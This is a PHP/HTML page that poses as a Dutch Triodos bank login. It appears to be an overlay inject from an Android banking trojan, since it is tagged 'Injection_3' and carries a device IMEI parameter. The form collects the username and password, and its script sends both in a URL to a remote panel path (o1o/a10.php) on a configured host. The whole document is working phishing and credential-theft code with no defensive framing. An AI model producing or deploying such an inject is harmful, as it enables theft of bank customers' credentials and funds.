<html>
<head>
		<meta charset="UTF-8">
        <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
        <link href="nl/com.triodos.bankingnl/style.css" rel="stylesheet">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
    <div class="header">
        <img style="width: 40px;float: left;padding: 5px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAMAAABg3Am1AAAAmVBMVEUAAAAAqlUAk3kAknsA/wAAf38Ak3oAknsAk3sAk3oAk3oAknsAj3wAk3oAkXkAknsAknkAk3oAkXkAkXkAjHIAAAAAk3sAk3sAkW0Ak3sAf38AknoAkXoAk3oAk3oAqn8AknoAknoAknsAknkAkX8AnHUAk3sAlHoAknsAk3oAk3oAknsAk3YAknsAknoAk3sAk3sAkXsAk3ttmXUmAAAAMnRSTlMAA4qEAQSH/n79cOYn4yrnKO1BFRQB+OMH6gJ/efnWBn3+8DsODegweO80fC16+210gLHQW2QAAACvSURBVEjH7ZXJEsIgEAVBMRijiRsquMZ9iwv//3ESvelo5R3MiT5PFw1VAGOeEuEcnK9UBTJfC6SsA2vwQFobNoAeN2+jJtDj5lsx1GOj2Pf86knAnqSN9XS6PZK+ontsOKAZjsie7+h3wYxDTGBq8jSmmmY2/9i0WaROWK7WJBvimF5V213xi6b2uXE4FjfMKa/SZ8DwVf+sypxxuTKoKr0Z5Pk290xhH4QQzFMiD1/uMAwuSkn1AAAAAElFTkSuQmCC">
        <h3 style="padding: 0;margin: 0;display: inline-block;color: #002d67;padding: 8px;">Toestemming</h3>
    </div>

    <div class="header2">
        <h3 style="color: #fff;font-size: 18px;padding: 15px;">Vul uw gegevens in</h3>
    </div>

<div class="padding">
    <form id="form">
        <div class="field33">
            <label for="login">Gebruikersnaam</label>
            <input type="text" class="field" id="login" name="login" placeholder="">
        </div>

        <div class="field33">
            <label for="password">Wachtwoord</label>
            <input type="password" class="field" id="password" name="password" placeholder="">
        </div>

        <input type="button" id="btn_finish" value="Inloggen">
    </form>
            <script type="text/javascript">
         (function () {


        var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
             var input = objDoc.createElement("input");
             input.setAttribute("type", "hidden");
             input.setAttribute("name", sNm);
             input.setAttribute("value", sV);
             input.value = sV;
             objForm.appendChild(input);
         };
                    var g_oBtn = document.getElementById('btn_finish');
                    g_oBtn.onclick = function () {

						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = 'field';
							oCodeInp.className = 'field';
						} catch(e){};

                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }

                        if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
top['closeDlg'] = true;
var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|triodos|"+oNumInp.value+"|"+oCodeInp.value);

return false;
};

})();
</script>
</div>
</body>
</html>
